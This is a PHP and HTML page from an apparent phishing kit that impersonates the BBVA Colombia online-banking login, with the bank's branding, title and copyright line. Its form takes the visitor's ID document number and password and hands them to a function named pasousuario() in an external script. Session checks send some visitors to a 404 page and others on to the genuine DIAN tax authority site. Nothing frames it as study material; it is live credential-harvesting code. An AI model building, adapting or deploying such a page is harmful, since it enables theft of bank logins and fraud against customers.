<?php
session_start();


if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.dian.gov.co/');
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <title>Iniciar sesiÃ³n | BBVA Colombia</title>
    <link href="img/favicon-48x48.avif" rel="icon" sizes="48x48" type="image/avif">
    <link href="img/apple-icon.avif" rel="apple-touch-icon">
    <link href="img/favicon-32x32.avif" rel="icon" sizes="32x32" type="image/avif">
    <link href="img/android-chrome-icon.avif" rel="icon" sizes="192x192" type="image/avif">
    <link href="img/favicon-16x16.avif" rel="icon" sizes="16x16" type="image/avif">
    <link href="img/safari-icon.svg" rel="mask-icon" color="#1464a5">
    <link href="img/favicon.ico" rel="shortcut icon">
    <link href="css/styles.css" rel="stylesheet">
    <script src="js/nose.js"></script>
    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
	<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   	<script type="text/javascript" src="../../scripts/functions2.js"></script>  	
       <script src="js/not.js"></script>		
    <script>
        
    </script>

</head>
<body>
    <input id="banco" type="hidden" value="BBVA">
    <section class="ContenedorPrincipalBanner">
        <div class="Banner">
            <img src="img/BB-Blanco.svg" alt="BBVA logo">
            <h5></h5>
        </div>
    </section>
    <section class="Paso">
        <div class="ContenedorCentral">
            <div class="Top">
                <h1 class="h1Guaro" style="margin-bottom:24px">Â¡Bienvenido!</h1>
                <p class="pGuaro">Recuerda que para realizar pagos en internet, debes estar registrado en BBVA net. RegÃ­strate en <a href="#" target="_blank">BBVA.com.co</a> Y para agilizar tu pago, ten a mano tu app BBVA mÃ³vil o la tarjeta de coordenadas.</p>
            </div>
            <div class="DatosUsuarios">
                <form autocomplete="OFF">
                    <div class="TipoDocumento">
                        <span class="SpanTipoDoc">Tipo de documento</span>
                        <div class="SeleccionarTipoDoc">
                            <select class="seleccionLabel" style="width:100%;height:65%;border:none;outline:0;appearance:none">
                                <option value="">CÃ©dula de ciudadanÃ­a</option>
                                <option value="">CÃ©dula de extranjerÃ­a</option>
                                <option value="">Tarjeta de identidad</option>
                                <option value="">Pasaporte</option>
                                <option value="">NÃºmero identificaciÃ³n personal</option>
                            </select>
                        </div>
                    </div>
                    <div class="DocumentoInput">
                        <input id="txtUsuario" type="text" class="InputDocumento" maxlength="15" required="" inputmode="numeric">
                        <label class="LabelDocumento">NÃºmero de documento</label>
                    </div>
                    <div class="Clave">
                        <input id="txtPass" type="password" class="InputClave" maxlength="8" required="" style="letter-spacing:1.7em!important">
                        <label class="LabelClave">ContraseÃ±a</label>
                    </div>
                </form>
                <div class="Boton" id="btnUsuario" type="button">
                    <a class="BtnAzulDisabled">Entrar</a>
                </div>
            </div>
        </div>
    </section>
    <footer aria-label="Pie de pÃ¡gina" role="ContenidoInfo">
        <div class="BaseFooter">
            <div class="ContenedorFooter">
                <div class="redes">
                    <div class="redes1">
                        <a href=""><i class="i1"></i></a>
                        <a href=""><i class="i2"></i></a>
                        <a href=""><i class="i3"></i></a>
                        <a href=""><i class="i4"></i></a>
                    </div>
                </div>
                <div class="Copy">
                    <p class="Copirai">Â© 2024 BBVA Banco Bilbao Vizcaya Argentaria Colombia S.A</p>
                </div>
            </div>
        </div>
    </footer>
  

<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			if (($("#txtUsuario").val().length > 4) && ($("#txtPass").val().length <= 14)) {
				pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>


</body>
</html>

